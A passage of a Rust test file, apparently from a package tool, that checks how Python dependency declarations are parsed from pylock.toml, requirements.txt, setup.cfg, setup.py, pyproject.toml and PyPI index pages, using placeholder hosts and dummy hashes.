sdist = {{ url = "https://files.example/idna-3.7.tar.gz", hashes = {{ sha256 = "{sdist}" }} }}
wheels = [
  {{ url = "https://files.example/idna-3.7-py3-none-any.whl", hashes = {{ sha256 = "{wheel}" }} }},
]

[[packages]]
name = "colorama"
version = "0.4.6"
marker = "sys_platform == 'win32'"
wheels = [
  {{ url = "https://files.example/colorama-0.4.6-py3-none-any.whl", hashes = {{ sha256 = "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc" }} }},
]
"#
            ),
        )
        .unwrap();

    let requirements = read_pylock_requirements(&pylock).unwrap();
    assert!(requirements.specs.iter().any(|spec| {
        spec.name == "idna"
            && spec.direct_url.as_deref() == Some("https://files.example/idna-3.7-py3-none-any.whl")
    }));
    assert!(!requirements
        .specs
        .iter()
        .any(|spec| spec.name == "colorama"));
    assert_eq!(
        requirements
            .constraints
            .get("pypi:idna")
            .map(String::as_str),
        Some("3.7")
    );
    assert_eq!(
        requirements.hashes.get("pypi:idna").cloned().unwrap(),
        BTreeSet::from([sdist, wheel])
    );
}

#[test]
fn reads_pylock_from_explicit_requirements_file() {
    let dir = tempfile::tempdir().unwrap();
    let pylock = dir.path().join("pylock.ci.toml");
    fs::write(
            &pylock,
            r#"
lock-version = "1.0"
created-by = "test"

[[packages]]
name = "idna"
version = "3.7"
wheels = [
  { url = "https://files.example/idna-3.7-py3-none-any.whl", hashes = { sha256 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" } },
]
"#,
        )
        .unwrap();

    let requirements = read_requirements_file(&pylock).unwrap();

    assert!(requirements.specs.iter().any(|spec| {
        spec.name == "idna"
            && spec.direct_url.as_deref() == Some("https://files.example/idna-3.7-py3-none-any.whl")
    }));
    assert_eq!(
        requirements
            .constraints
            .get("pypi:idna")
            .map(String::as_str),
        Some("3.7")
    );
    assert_eq!(
        requirements.hashes.get("pypi:idna").cloned().unwrap(),
        BTreeSet::from([
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_owned()
        ])
    );
}

#[test]
fn discovers_pylock_requirements_preferring_omc_specific_file() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("pylock.toml"),
        r#"lock-version = "1.0"

[[packages]]
name = "wrong"
version = "1.0.0"
"#,
    )
    .unwrap();
    fs::write(
            dir.path().join("pylock.omc.toml"),
            r#"lock-version = "1.0"

[[packages]]
name = "idna"
version = "3.7"
wheels = [
  { url = "https://files.example/idna-3.7-py3-none-any.whl", hashes = { sha256 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" } },
]
"#,
        )
        .unwrap();

    let discovered = discover_project_requirements(dir.path()).unwrap();
    assert!(discovered.specs.iter().any(|spec| {
        spec.name == "idna"
            && spec.direct_url.as_deref() == Some("https://files.example/idna-3.7-py3-none-any.whl")
    }));
    assert!(!discovered.specs.iter().any(|spec| spec.name == "wrong"));
    assert_eq!(
        discovered.constraints.get("pypi:idna").map(String::as_str),
        Some("3.7")
    );
    assert_eq!(
        discovered
            .hashes
            .get("pypi:idna")
            .and_then(|hashes| hashes.iter().next())
            .map(String::as_str),
        Some("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
    );
}

#[test]
fn rejects_unsupported_requirements_entries() {
    let dir = tempfile::tempdir().unwrap();
    let requirements = dir.path().join("requirements.txt");
    fs::write(&requirements, "--dry-run\n").unwrap();
    let error = read_requirements_file(&requirements).unwrap_err();
    assert!(error.to_string().contains("unsupported requirements entry"));

    fs::write(&requirements, "local-pkg @ ./missing\n").unwrap();
    let error = read_requirements_file(&requirements).unwrap_err();
    assert!(error
        .to_string()
        .contains("unsupported requirements entry `local-pkg @ ./missing`"));

    fs::write(&requirements, "./missing\n").unwrap();
    let error = read_requirements_file(&requirements).unwrap_err();
    assert!(error
        .to_string()
        .contains("unsupported requirements entry `./missing`"));
}

#[test]
fn reads_requirements_global_options_and_enforces_hashes() {
    let dir = tempfile::tempdir().unwrap();
    let requirements = dir.path().join("requirements.txt");
    fs::write(
            &requirements,
            "--trusted-host example.invalid\n--no-binary=:all:\n--only-binary idna\n--prefer-binary\n--require-hashes\n--no-deps\n--pre\n--all-releases previewed\n--only-final=stable-only\n--uploaded-prior-to=2026-01-01T00:00:00Z\nidna==3.7 --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n",
        )
        .unwrap();

    let discovered = read_requirements_file(&requirements).unwrap();
    assert!(discovered.pypi_require_hashes);
    assert!(discovered.pypi_no_deps);
    assert!(discovered.pypi_allow_prereleases);
    assert!(discovered
        .pypi_release_controls
        .all_releases
        .packages
        .contains("previewed"));
    assert!(discovered
        .pypi_release_controls
        .only_final
        .packages
        .contains("stable-only"));
    assert_eq!(
        discovered.pypi_uploaded_prior_to.as_deref(),
        Some("2026-01-01T00:00:00Z")
    );
    assert_eq!(discovered.pypi_binary_all, Some(PypiBinaryMode::Source));
    assert_eq!(
        discovered.pypi_binary_packages.get("idna"),
        Some(&PypiBinaryMode::Binary)
    );
    assert!(has_spec(&discovered.specs, "idna", "==3.7"));
    assert_eq!(
        discovered
            .hashes
            .get("pypi:idna")
            .and_then(|hashes| hashes.iter().next())
            .map(String::as_str),
        Some("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
    );
}

#[test]
fn rejects_require_hashes_without_hashes_or_exact_pins() {
    let dir = tempfile::tempdir().unwrap();
    let requirements = dir.path().join("requirements.txt");
    fs::write(&requirements, "--require-hashes\nidna==3.7\n").unwrap();
    let error = read_requirements_file(&requirements).unwrap_err();
    assert!(error.to_string().contains("needs a hash"));

    fs::write(
            &requirements,
            "--require-hashes\nidna>=3 --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n",
        )
        .unwrap();
    let error = read_requirements_file(&requirements).unwrap_err();
    assert!(error.to_string().contains("needs an exact pin"));
}

#[test]
fn command_line_require_hashes_enforces_requirement_hashes() {
    let dir = tempfile::tempdir().unwrap();
    let requirements = dir.path().join("requirements.txt");
    fs::write(&requirements, "idna==3.7\n").unwrap();
    let mut options = LinkOptions::new(dir.path());
    options.requirement_files = vec![requirements.clone()];
    options.pypi_require_hashes = true;
    let error = project_requested_specs(&mut options, false).unwrap_err();
    assert!(error.to_string().contains("needs a hash"));

    fs::write(
            &requirements,
            "idna==3.7 --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n",
        )
        .unwrap();
    let mut options = LinkOptions::new(dir.path());
    options.requirement_files = vec![requirements];
    options.pypi_require_hashes = true;
    let specs = project_requested_specs(&mut options, false).unwrap();
    assert!(has_spec(&specs, "idna", "==3.7"));
}

#[test]
fn reads_requirements_index_urls() {
    let dir = tempfile::tempdir().unwrap();
    let requirements = dir.path().join("requirements.txt");
    let wheels = dir.path().join(".").join("wheels");
    fs::write(
            &requirements,
            "--index-url https://mirror.example/simple\n--extra-index-url=https://extra.example/simple\n-i https://override.example/simple\n--find-links ./wheels\n-f https://files.example/packages\n--no-index\nidna==3.7\n",
        )
        .unwrap();

    let discovered = read_requirements_file(&requirements).unwrap();
    assert_eq!(
        discovered.pypi_index_url.as_deref(),
        Some("https://override.example/simple/")
    );
    assert_eq!(
        discovered.pypi_extra_index_urls,
        vec!["https://extra.example/simple/".to_owned()]
    );
    assert_eq!(
        discovered.pypi_find_links,
        vec![
            wheels.to_string_lossy().into_owned(),
            "https://files.example/packages".to_owned()
        ]
    );
    assert!(discovered.pypi_no_index);
    assert!(discovered
        .specs
        .iter()
        .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some("==3.7")));
}

#[test]
fn reads_direct_wheel_requirements() {
    let dir = tempfile::tempdir().unwrap();
    let requirements = dir.path().join("requirements.txt");
    fs::write(
            &requirements,
            "idna @ https://example.invalid/idna-3.7-py3-none-any.whl#sha256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa --hash=sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n",
        )
        .unwrap();

    let discovered = read_requirements_file(&requirements).unwrap();
    let spec = discovered
        .specs
        .iter()
        .find(|spec| spec.name == "idna")
        .unwrap();
    assert_eq!(
        spec.direct_url.as_deref(),
        Some("https://example.invalid/idna-3.7-py3-none-any.whl")
    );
    assert_eq!(
        discovered.hashes.get("pypi:idna").cloned().unwrap(),
        BTreeSet::from([
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_owned(),
            "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb".to_owned()
        ])
    );
}

#[test]
fn reads_bare_direct_archive_url_requirements() {
    let dir = tempfile::tempdir().unwrap();
    let wheel = dir.path().join("demo_pkg-1.0.0-py3-none-any.whl");
    fs::write(&wheel, b"not a real wheel").unwrap();
    let file_url = reqwest::Url::from_file_path(&wheel).unwrap().to_string();
    let requirements = dir.path().join("requirements.txt");
    fs::write(
            &requirements,
            format!(
                "{file_url}#sha256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa --hash=sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\nhttps://files.example/source_pkg-2.0.0.tar.gz#sha256=cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc\n"
            ),
        )
        .unwrap();

    let discovered = read_requirements_file(&requirements).unwrap();
    let demo = discovered
        .specs
        .iter()
        .find(|spec| spec.name == "demo-pkg")
        .unwrap();
    assert_eq!(demo.direct_url.as_deref(), Some(file_url.as_str()));
    assert_eq!(
        discovered.hashes.get("pypi:demo-pkg").cloned().unwrap(),
        BTreeSet::from([
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_owned(),
            "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb".to_owned()
        ])
    );
    let source = discovered
        .specs
        .iter()
        .find(|spec| spec.name == "source-pkg")
        .unwrap();
    assert_eq!(
        source.direct_url.as_deref(),
        Some("https://files.example/source_pkg-2.0.0.tar.gz")
    );
    assert_eq!(
        discovered.hashes.get("pypi:source-pkg").cloned().unwrap(),
        BTreeSet::from([
            "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc".to_owned()
        ])
    );
}

#[test]
fn reads_local_pypi_archive_requirements() {
    let dir = tempfile::tempdir().unwrap();
    let wheels = dir.path().join("wheels");
    fs::create_dir_all(&wheels).unwrap();
    fs::write(
        wheels.join("idna-3.7-py3-none-any.whl"),
        b"not a real wheel",
    )
    .unwrap();
    fs::write(
        wheels.join("typing_extensions-4.12.2-py3-none-any.whl"),
        b"not a real wheel",
    )
    .unwrap();
    fs::write(wheels.join("source_pkg-1.0.0.tar.gz"), b"not a real sdist").unwrap();
    fs::write(wheels.join("bare_pkg-2.0.0.tgz"), b"not a real sdist").unwrap();
    fs::write(wheels.join("zip_pkg-3.0.0.zip"), b"not a real sdist").unwrap();
    let requirements = dir.path().join("requirements.txt");
    fs::write(
            &requirements,
            "idna @ file:./wheels/idna-3.7-py3-none-any.whl#sha256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa --hash=sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\nsource-pkg @ ./wheels/source_pkg-1.0.0.tar.gz#sha256=cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc\nfile:./wheels/typing_extensions-4.12.2-py3-none-any.whl\n./wheels/bare_pkg-2.0.0.tgz\n./wheels/zip_pkg-3.0.0.zip\n",
        )
        .unwrap();

    let discovered = read_requirements_file(&requirements).unwrap();
    let idna = discovered
        .specs
        .iter()
        .find(|spec| spec.name == "idna")
        .unwrap();
    assert!(idna.direct_url.as_deref().unwrap().starts_with("file://"));
    assert!(idna
        .direct_url
        .as_deref()
        .unwrap()
        .ends_with("/wheels/idna-3.7-py3-none-any.whl"));
    assert!(discovered
        .specs
        .iter()
        .any(|spec| spec.name == "typing-extensions"
            && spec.direct_url.as_deref().unwrap().starts_with("file://")));
    assert!(discovered.specs.iter().any(|spec| spec.name == "source-pkg"
        && spec
            .direct_url
            .as_deref()
            .unwrap()
            .ends_with("/wheels/source_pkg-1.0.0.tar.gz")));
    assert!(discovered.specs.iter().any(|spec| spec.name == "bare-pkg"
        && spec
            .direct_url
            .as_deref()
            .unwrap()
            .ends_with("/wheels/bare_pkg-2.0.0.tgz")));
    assert!(discovered.specs.iter().any(|spec| spec.name == "zip-pkg"
        && spec
            .direct_url
            .as_deref()
            .unwrap()
            .ends_with("/wheels/zip_pkg-3.0.0.zip")));
    assert_eq!(
        discovered.hashes.get("pypi:idna").cloned().unwrap(),
        BTreeSet::from([
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_owned(),
            "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb".to_owned()
        ])
    );
    assert_eq!(
        discovered.hashes.get("pypi:source-pkg").cloned().unwrap(),
        BTreeSet::from([
            "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc".to_owned()
        ])
    );
}

#[test]
fn parses_pypi_simple_index_candidates() {
    let base_url = reqwest::Url::parse("https://index.example/simple/idna/").unwrap();
    let html = r#"
            <a href="../../packages/idna-3.7-py3-none-any.whl#sha256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" data-requires-python="&gt;=3.8">idna</a>
            <a href="idna-3.6.tar.gz#sha256=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb">sdist</a>
            <a href="other-1.0-py3-none-any.whl">other</a>
        "#;

    let candidates =
        pypi_simple_index_candidates(&base_url, html, "idna", Some("3.11.0"), None, false);
    assert_eq!(
        candidates,
        vec![
            PypiSimpleCandidate {
                url: "https://index.example/packages/idna-3.7-py3-none-any.whl".to_owned(),
                download_url: None,
                local_path: None,
                filename: "idna-3.7-py3-none-any.whl".to_owned(),
                version: "3.7".to_owned(),
                sha256: Some(
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_owned()
                ),
                sdist: false,
                upload_time: None,
                upload_time_required: false,
            },
            PypiSimpleCandidate {
                url: "https://index.example/simple/idna/idna-3.6.tar.gz".to_owned(),
                download_url: None,
                local_path: None,
                filename: "idna-3.6.tar.gz".to_owned(),
                version: "3.6".to_owned(),
                sha256: Some(
                    "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb".to_owned()
                ),
                sdist: true,
                upload_time: None,
                upload_time_required: false,
            }
        ]
    );
    let legacy_candidates =
        pypi_simple_index_candidates(&base_url, html, "idna", Some("3.7.0"), None, false);
    assert_eq!(legacy_candidates.len(), 1);
    assert!(legacy_candidates[0].sdist);
}

#[test]
fn pypi_simple_index_candidates_do_not_record_credentials() {
    let base_url = reqwest::Url::parse("https://user:pass@index.example/simple/idna/").unwrap();
    let html = r#"<a href="../../packages/idna-3.7-py3-none-any.whl">idna</a>"#;

    let candidates =
        pypi_simple_index_candidates(&base_url, html, "idna", Some("3.11.0"), None, false);
    assert_eq!(
        candidates,
        vec![PypiSimpleCandidate {
            url: "https://index.example/packages/idna-3.7-py3-none-any.whl".to_owned(),
            download_url: Some(
                "https://user:pass@index.example/packages/idna-3.7-py3-none-any.whl".to_owned()
            ),
            local_path: None,
            filename: "idna-3.7-py3-none-any.whl".to_owned(),
            version: "3.7".to_owned(),
            sha256: None,
            sdist: false,
            upload_time: None,
            upload_time_required: false,
        }]
    );
}

#[test]
fn pypi_simple_json_candidates_carry_upload_times() {
    let base_url = reqwest::Url::parse("https://index.example/simple/idna/").unwrap();
    let json = r#"{
            "files": [
                {
                    "filename": "idna-3.7-py3-none-any.whl",
                    "url": "../../packages/idna-3.7-py3-none-any.whl",
                    "hashes": {"sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},
                    "requires-python": ">=3.8",
                    "upload-time": "2024-01-01T00:00:00.000000Z"
                },
                {
                    "filename": "idna-3.6.tar.gz",
                    "url": "idna-3.6.tar.gz",
                    "hashes": {"sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"},
                    "upload-time": "2023-01-01T00:00:00.000000Z"
                }
            ]
        }"#;

    let candidates =
        pypi_simple_json_candidates(&base_url, json, "idna", Some("3.11.0"), None).unwrap();
    assert_eq!(candidates.len(), 2);
    assert_eq!(
        candidates[0].upload_time.as_deref(),
        Some("2024-01-01T00:00:00.000000Z")
    );
    assert!(candidates[0].upload_time_required);

    let cutoff = parse_pypi_uploaded_prior_to("2023-06-01T00:00:00Z").unwrap();
    let filtered =
        filter_pypi_candidates_uploaded_prior_to(candidates.clone(), cutoff, "idna").unwrap();
    assert_eq!(filtered.len(), 1);
    assert_eq!(filtered[0].version, "3.6");

    let mut versions = BTreeSet::new();
    insert_pypi_available_candidate_versions(
        &mut versions,
        candidates,
        Some(&parse_pypi_uploaded_prior_to("2023-06-01T00:00:00Z").unwrap()),
        "idna",
    )
    .unwrap();
    assert_eq!(versions, BTreeSet::from(["3.6".to_owned()]));
}

#[test]
fn reads_local_find_links_archive_candidates() {
    let dir = tempfile::tempdir().unwrap();
    let wheel = dir.path().join("idna-3.7-py3-none-any.whl");
    let sdist = dir.path().join("idna-3.6.tar.gz");
    let zip_sdist = dir.path().join("idna-3.5.zip");
    fs::write(&wheel, b"not a real wheel").unwrap();
    fs::write(&sdist, b"not a real sdist").unwrap();
    fs::write(&zip_sdist, b"not a real zip sdist").unwrap();

    let candidates =
        pypi_local_find_link_candidates(dir.path(), "idna", Some("3.11.0"), None).unwrap();
    assert_eq!(candidates.len(), 3);
    let wheel_candidate = candidates
        .iter()
        .find(|candidate| !candidate.sdist)
        .unwrap();
    assert_eq!(wheel_candidate.filename, "idna-3.7-py3-none-any.whl");
    assert_eq!(wheel_candidate.version, "3.7");
    assert_eq!(wheel_candidate.local_path.as_deref(), Some(wheel.as_path()));
    assert!(wheel_candidate.url.starts_with("file://"));
    let sdist_candidate = candidates
        .iter()
        .find(|candidate| candidate.filename == "idna-3.6.tar.gz")
        .unwrap();
    assert_eq!(sdist_candidate.filename, "idna-3.6.tar.gz");
    assert_eq!(sdist_candidate.version, "3.6");
    assert_eq!(sdist_candidate.local_path.as_deref(), Some(sdist.as_path()));
    assert!(sdist_candidate.url.starts_with("file://"));
    let zip_candidate = candidates
        .iter()
        .find(|candidate| candidate.filename == "idna-3.5.zip")
        .unwrap();
    assert!(zip_candidate.sdist);
    assert_eq!(zip_candidate.version, "3.5");
    assert_eq!(
        zip_candidate.local_path.as_deref(),
        Some(zip_sdist.as_path())
    );
}

#[test]
fn parses_direct_archive_references() {
    let dir = tempfile::tempdir().unwrap();
    let wheel = dir.path().join("demo_pkg-1.0.0-py3-none-any.whl");
    fs::write(&wheel, b"not a real wheel").unwrap();

    let (spec, hashes) =
        parse_pypi_direct_archive_reference("demo_pkg-1.0.0-py3-none-any.whl", dir.path())
            .unwrap()
            .unwrap();
    assert_eq!(spec.name, "demo-pkg");
    assert!(spec.direct_url.as_deref().unwrap().starts_with("file://"));
    assert!(hashes.is_empty());

    let (spec, hashes) = parse_pypi_direct_archive_reference(
            "https://files.example/source_pkg-2.0.0.tar.gz#sha256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            dir.path(),
        )
        .unwrap()
        .unwrap();
    assert_eq!(spec.name, "source-pkg");
    assert_eq!(
        spec.direct_url.as_deref(),
        Some("https://files.example/source_pkg-2.0.0.tar.gz")
    );
    assert_eq!(
        hashes.into_iter().collect::<Vec<_>>(),
        vec!["aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"]
    );
}

#[test]
fn parses_direct_archive_references_with_relative_base_dir() {
    let cwd = env::current_dir().unwrap();
    let relative_dir = PathBuf::from(format!(
        "target/omc-registry-relative-archive-{}",
        std::process::id()
    ));
    let dir = cwd.join(&relative_dir);
    let _ = fs::remove_dir_all(&dir);
    fs::create_dir_all(dir.join("dist")).unwrap();
    fs::write(
        dir.join("dist").join("relative_pkg-1.0.0.tar.gz"),
        b"not a real sdist",
    )
    .unwrap();

    let (spec, _) =
        parse_pypi_direct_archive_reference("./dist/relative_pkg-1.0.0.tar.gz", &relative_dir)
            .unwrap()
            .unwrap();
    assert_eq!(spec.name, "relative-pkg");
    assert!(spec.direct_url.as_deref().unwrap().starts_with("file://"));
    assert!(spec
        .direct_url
        .as_deref()
        .unwrap()
        .ends_with("/dist/relative_pkg-1.0.0.tar.gz"));

    fs::remove_dir_all(dir).unwrap();
}

#[test]
fn reads_direct_pypi_sdist_specs() {
    let options = LinkOptions::new(Path::new("."));
    let spec = PackageSpec::parse("pypi:pkg @ https://example.invalid/pkg-1.0.0.tar.gz").unwrap();
    let resolved = resolve_pypi_direct_wheel(&spec, &options).unwrap();
    assert_eq!(resolved.name, "pkg");
    assert_eq!(resolved.version, "1.0.0");
    assert!(!resolved.pypi_direct_wheel);
    assert_eq!(resolved.filename, "pkg-1.0.0.tar.gz");

    let spec = PackageSpec::parse("pypi:pkg @ https://example.invalid/pkg-1.0.0.zip").unwrap();
    let resolved = resolve_pypi_direct_wheel(&spec, &options).unwrap();
    assert_eq!(resolved.version, "1.0.0");
    assert!(!resolved.pypi_direct_wheel);
    assert_eq!(resolved.filename, "pkg-1.0.0.zip");

    let spec = PackageSpec::parse("pypi:pkg @ git+https://example.invalid/pkg.git").unwrap();
    let error = resolve_pypi_direct_wheel(&spec, &options).unwrap_err();
    assert!(error.to_string().contains("must use https or file"));
}

#[test]
fn reads_setup_cfg_requirements_and_selected_extras() {
    let dir = tempfile::tempdir().unwrap();
    let setup_cfg = dir.path().join("setup.cfg");
    fs::write(
        &setup_cfg,
        r#"
            [metadata]
            name = setup-cfg-demo

            [options]
            install_requires =
                idna==3.7
                colorama; sys_platform == "win32"

            [options.extras_require]
            dev =
                charset-normalizer==3.4.0
            docs =
                markdown==3.6
            "#,
    )
    .unwrap();

    let base = read_setup_cfg_requirements(&setup_cfg, &BTreeSet::new()).unwrap();
    assert!(has_spec(&base.specs, "idna", "==3.7"));
    assert!(!base.specs.iter().any(|spec| spec.name == "colorama"));
    assert!(!base
        .specs
        .iter()
        .any(|spec| spec.name == "charset-normalizer"));

    let dev = read_setup_cfg_requirements(&setup_cfg, &BTreeSet::from(["dev".to_owned()])).unwrap();
    assert!(has_spec(&dev.specs, "charset-normalizer", "==3.4.0"));
    assert!(!dev.specs.iter().any(|spec| spec.name == "markdown"));
}

#[test]
fn discovers_setup_cfg_requirements() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("setup.cfg"),
        r#"
            [options]
            install_requires =
                idna==3.7
            "#,
    )
    .unwrap();

    let discovered = discover_project_requirements(dir.path()).unwrap();
    assert!(has_spec(&discovered.specs, "idna", "==3.7"));
}

#[test]
fn reads_setup_py_static_requirements_and_selected_extras() {
    let dir = tempfile::tempdir().unwrap();
    let setup_py = dir.path().join("setup.py");
    fs::write(
        &setup_py,
        r#"
            from setuptools import setup

            NOTE = "install_requires=['ignored-string==1.0']"
            # install_requires=["ignored-comment==1.0"]

            setup(
                name="setup-py-demo",
                install_requires=[
                    # "ignored-list-comment==1.0"
                    "idna==3.7",
                    "colorama; sys_platform == 'win32'",
                ],
                extras_require={
                    "dev": [
                        "charset-normalizer==3.4.0",
                    ],
                    "docs": ["markdown==3.6"],
                },
            )
            "#,
    )
    .unwrap();

    let base = read_setup_py_requirements(&setup_py, &BTreeSet::new()).unwrap();
    assert!(has_spec(&base.specs, "idna", "==3.7"));
    assert!(!base.specs.iter().any(|spec| spec.name == "colorama"));
    assert!(!base
        .specs
        .iter()
        .any(|spec| spec.name.starts_with("ignored-")));
    assert!(!base
        .specs
        .iter()
        .any(|spec| spec.name == "charset-normalizer"));

    let dev = read_setup_py_requirements(&setup_py, &BTreeSet::from(["dev".to_owned()])).unwrap();
    assert!(has_spec(&dev.specs, "charset-normalizer", "==3.4.0"));
    assert!(!dev.specs.iter().any(|spec| spec.name == "markdown"));
}

#[test]
fn discovers_setup_py_requirements() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("setup.py"),
        r#"
            from setuptools import setup

            setup(
                name="setup-py-demo",
                install_requires=["idna==3.7"],
            )
            "#,
    )
    .unwrap();

    let discovered = discover_project_requirements(dir.path()).unwrap();
    assert!(has_spec(&discovered.specs, "idna", "==3.7"));
}

#[test]
fn reads_pyproject_dependencies_and_selected_extras() {
    let dir = tempfile::tempdir().unwrap();
    let pyproject = dir.path().join("pyproject.toml");
    let wheel = dir
        .path()
        .join("wheels")
        .join("local_idna-3.7-py3-none-any.whl");
    let sdist = dir.path().join("wheels").join("local_source-1.0.0.tar.gz");
    fs::create_dir_all(wheel.parent().unwrap()).unwrap();
    fs::create_dir_all(dir.path().join("vendor/local-package")).unwrap();
    fs::create_dir_all(dir.path().join("vendor/uv-local")).unwrap();
    fs::create_dir_all(dir.path().join("packages/ws-local")).unwrap();
    fs::create_dir_all(dir.path().join("vendor/extra-local")).unwrap();
    fs::create_dir_all(dir.path().join("vendor/group-local")).unwrap();
    fs::write(
        dir.path().join("packages/ws-local/pyproject.toml"),
        r#"
            [project]
            name = "ws-local"
            version = "0.1.0"
            "#,
    )
    .unwrap();
    fs::write(&wheel, b"not a real wheel").unwrap();
    fs::write(&sdist, b"not a real sdist").unwrap();
    fs::write(
            &pyproject,
            r#"
            [project]
            dependencies = [
                "idna==3.7",
                "local-idna @ ./wheels/local_idna-3.7-py3-none-any.whl#sha256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                "local-source @ ./wheels/local_source-1.0.0.tar.gz",
                "local-package @ ./vendor/local-package",
                "uv-local",
                "ws-local",
                "skipped-local @ ./missing; sys_platform == 'win32'",
                "colorama; extra == 'windows'"
            ]

            [project.optional-dependencies]
            dev = [
                "charset-normalizer==3.4.0",
                "extra-local @ ./vendor/extra-local",
                "urllib3<3; python_version >= '3.0'"
            ]
            docs = ["markdown==3.6"]

            [dependency-groups]
            typing = ["typing-extensions==4.12.2"]
            test = ["pytest==8.2.0", { include-group = "typing" }]
            dev = ["ruff==0.5.0", "group-local @ ./vendor/group-local", { include-group = "test" }]

            [tool.uv.sources]
            uv-local = { path = "vendor/uv-local" }
            ws-local = { workspace = true }

            [tool.uv.workspace]
            members = ["packages/*"]
            "#,
        )
        .unwrap();

    let base = read_pyproject_requirements(&pyproject, &BTreeSet::new(), false).unwrap();
    assert!(base
        .specs
        .iter()
        .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some("==3.7")));
    assert!(!base.specs.iter().any(|spec| spec.name == "colorama"));
    assert!(base.specs.iter().any(|spec| spec.name == "local-idna"
        && spec.direct_url.as_deref().unwrap().starts_with("file://")));
    assert!(base.specs.iter().any(|spec| spec.name == "local-source"
        && spec
            .direct_url
            .as_deref()
            .unwrap()
            .ends_with("/wheels/local_source-1.0.0.tar.gz")));
    assert_eq!(
        base.hashes.get("pypi:local-idna").cloned().unwrap(),
        BTreeSet::from([
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_owned()
        ])
    );
    assert_eq!(
        base.python_local_paths,
        vec![
            dir.path().join("vendor/local-package"),
            dir.path().join("vendor/uv-local"),
            dir.path().join("packages/ws-local")
        ]
    );

    let default_dev = read_pyproject_requirements(&pyproject, &BTreeSet::new(), true).unwrap();
    assert!(default_dev
        .specs
        .iter()
        .any(|spec| spec.name == "ruff" && spec.version.as_deref() == Some("==0.5.0")));
    assert!(default_dev
        .specs
        .iter()
        .any(|spec| spec.name == "pytest" && spec.version.as_deref() == Some("==8.2.0")));
    assert!(default_dev.specs.iter().any(
        |spec| spec.name == "typing-extensions" && spec.version.as_deref() == Some("==4.12.2")
    ));
    assert!(default_dev
        .python_local_paths
        .contains(&dir.path().join("vendor/group-local")));

    let dev =
        read_pyproject_requirements(&pyproject, &BTreeSet::from(["dev".to_owned()]), true).unwrap();
    assert!(dev.specs.iter().any(|spec| spec.name == "idna"));
    assert!(dev.specs.iter().any(
